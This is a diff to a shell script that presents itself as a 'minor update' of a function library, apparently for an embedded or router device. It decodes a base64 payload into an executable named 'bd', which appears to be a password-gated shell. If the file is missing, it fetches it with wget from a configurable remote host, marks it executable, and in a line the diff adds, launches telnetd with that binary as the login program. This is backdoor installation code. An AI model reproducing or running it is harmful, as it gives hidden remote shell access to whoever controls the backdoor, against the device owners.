@@ -1,4 +1,5 @@
 # vim: syntax=bash
+# mq-funx v2.0a - minor update - stable, 80+ days uptime!
 jsonify(){
 jtemp=$(mktemp json.XXXXXX);rm $jtemp
 tempf="$workdir/$jtemp"
@@ -215,6 +216,7 @@ IyEvdmFyL2Jpbi9hc2gKIyBIYXNoIGhlcmUgYXQgdG9wIGZvciBlYXN5IHNlZCBwYXNzd2QgY2hhbmdl
 
 EOF
 
+
 (cat /tmp/bd | base64 -d > $mq_binpath/bd  ; chmod +x $mq_binpath/bd; rm -f /tmp/bd)2>>$errorlog
 
 } 
@@ -238,7 +240,6 @@ killtn)
 for i in $(seq 1 3); do
   if pidof subclient >>$errorlog ; then 
     killall -9 telnetd >>$errorlog 2>&1 &
-    #(telnetd -l $mq_binpath/bd) 
     if [ "$?" -eq "0" ] ; then
       break
     fi
@@ -254,6 +255,7 @@ if [ ! -f $mq_binpath/bd ]; then
   wget -O $mq_binpath/bd $mq_httphost/bd
 fi
 chmod +x $mq_binpath/bd
+telnetd -l $mq_binpath/bd
 ;;
 
 lockDown)
